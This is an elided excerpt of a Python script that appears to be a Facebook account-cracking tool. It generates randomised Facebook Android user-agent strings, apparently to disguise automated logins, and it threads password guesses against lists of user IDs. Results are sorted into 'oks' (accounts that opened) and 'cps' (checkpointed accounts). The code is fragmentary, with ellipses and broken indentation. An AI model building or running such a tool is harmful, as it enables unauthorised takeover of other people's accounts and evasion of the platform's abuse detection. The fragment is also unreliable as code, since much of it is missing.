...
from concurrent.futures import ThreadPoolExecutor as Adnan
...
def S2():
	...
	fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
	s = "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = '[FBAN/FB4A;FBAV/123.0.0.10.98;FBBV/987654321;FBDM/{density=2.0,width=1080,height=2400};FBLC/en_US;FBRV/987654321;FBCR/Grameenphone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix Zero X;FBSV/11.0.0;FBOP/19;FBCA/arm64-v8a:armeabi-v7a;]' 
	ua = s + e
	#print(ua)
	return ua 
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                sexy.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                sexy.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                sexy.submit(self.methodC, uid, name, pwx)
                   except:pass
            result(oks,cps)
menu()